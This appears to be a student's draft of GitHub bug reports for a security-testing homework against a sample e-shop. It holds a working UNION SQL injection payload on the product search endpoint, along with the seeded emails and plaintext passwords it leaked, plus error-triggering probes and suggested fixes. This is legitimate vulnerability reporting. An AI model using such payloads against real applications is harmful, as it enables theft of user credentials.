# HW06 — Draft GitHub Issues (eshop-sut, `IamTpG/eshop-sut` fork)

Draft only — not yet posted. Review before posting, especially Issue 1 (contains a live
working exploit + real seeded credentials).

---

## Issue 1 — [Critical] SQL injection in `GET /api/products?search=` leaks all user credentials in plaintext

**Severity:** Critical
**Labels:** bug, security, sql-injection

### Summary
`GET /api/products?search=` builds its SQL query via raw string concatenation
(`backend/server.js:144`), with no input sanitization or parameterization — a direct
violation of **SEC-05** ("Truy vấn CSDL phải dùng Parameterized Query"). This is exploitable
by any anonymous caller (the endpoint requires no auth, violating no specific SEC item
itself since it's meant to be public, but makes the injection unauthenticated).

A UNION-based payload against this single endpoint dumps every seeded user's `email` and
**plaintext password** from the `users` table — which is itself a separate SEC-01
violation ("Mật khẩu không được lưu dưới dạng plaintext"): the passwords are not hashed at
all.

### Steps to reproduce
```
GET /api/products?search=zzz' UNION SELECT id,email,password,role,'leak',1 FROM users --
```

### Actual result
```json
[
  {"id":1,"name":"admin@eshop.com","price":"Admin123!","description":"admin","imageUrl":"leak","category_id":1},
  {"id":2,"name":"test@eshop.com","price":"Test1234!","description":"user","imageUrl":"leak","category_id":1},
  {"id":3,"name":"hw06test@eshop.com","price":"Password123!","description":"user","imageUrl":"leak","category_id":1}
]
```
(`name` column repurposed to carry `email`, `price` to carry the raw `password` — 6-column
UNION matching the `products` table's schema.)

### Expected result
`search` should never be interpolated directly into SQL; the query should use a
parameterized statement (e.g. `db.all("SELECT * FROM products WHERE name LIKE ?", [\`%${searchQuery}%\`])`
with the sqlite3 driver's placeholder binding). Passwords should be hashed (bcrypt/argon2)
before storage, independent of this injection vector.

### Related, lower-severity findings on the same endpoint (folded into this issue)
- A simple syntax-breaking payload (`search='`) triggers a 500 with the raw
  `SQLITE_ERROR: ...` engine message returned verbatim in the response body —
  information disclosure that aids further attack reconnaissance.
- Confirmed (as a negative/scoping result, not a further vulnerability) that stacked
  queries via `;` are **not** exploitable through this code path — `node-sqlite3`'s
  `db.all()` only prepares the first statement, so e.g. `search=x'; SELECT 1 --` executes
  only the first `SELECT`. A destructive payload (`DROP TABLE`) was deliberately never
  attempted against the shared local SUT instance.

### Evidence
🔴 MANUAL — screenshot of the reproduction (request + leaked response) to attach here.

---

## Issue 2 — [Low] Inconsistent Content-Type between success and error responses on `GET /api/products`

**Severity:** Low
**Labels:** bug, api-design

### Summary
`GET /api/products?search=` returns `application/json` on success (200) but
`text/html` on its error path (500, via `res.send()` with a template string starting
`<h1>...`). A JSON REST API should return a JSON error body on failure so API clients
don't have to special-case HTML parsing for one endpoint's failure mode.

### Steps to reproduce
```
GET /api/products?search='
```
→ 500, `Content-Type: text/html; charset=utf-8`, body `<h1>Database Error</h1><p>...</p>`

### Expected result
Error responses should be `application/json`, e.g.
`{"error": "Internal server error"}`, without leaking the raw engine message either way
(see Issue 1's related-findings note).

### Evidence
🔴 MANUAL — screenshot to attach.

---

*A 3rd/4th issue slot is reserved for API2 (`POST /api/cart`) and API3
(`POST /api/admin/coupons`) findings once those pipelines run.*
